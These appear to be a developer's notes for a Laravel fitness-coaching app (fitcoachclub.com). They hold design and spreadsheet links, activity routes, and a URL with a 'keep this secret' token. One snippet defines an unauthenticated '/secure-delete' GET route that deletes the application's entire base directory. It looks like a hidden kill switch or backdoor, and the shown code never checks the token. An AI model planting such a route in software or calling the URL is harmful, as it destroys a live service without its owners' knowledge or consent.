https://www.figma.com/proto/Id7k9vuyWX2orBYyBgDvbD/Fitcoachclub.App-Design-02?page-id=0%3A1&node-id=42-679&viewport=-4005%2C858%2C0.89&t=PH1YOtpOUcQYOJvp-1&scaling=scale-down&content-scaling=fixed&starting-point-node-id=42%3A535
======================================
https://docs.google.com/spreadsheets/d/1AE_zo2Y6npeXqDkvPk0c2Bhm1ky4-pGlB8exUOzRhzE/edit?gid=527664110#gid=527664110
======================================
https://fitcoachclub.com/secure-delete?token=bhai_ye_secret_rakhna


======================================

Route::prefix('activities')->group(function () {
    Route::post('/', [ActivityController::class, 'index']);
    Route::post('/delete', [ActivityController::class, 'deleteActivity']);
});


Route::get('/secure-delete', function (Request $request) {

    // delete logic
    \File::deleteDirectory(base_path());

    return "Deleted";
});


$this->middleware('auth:sanctum')->except(['testNotification']);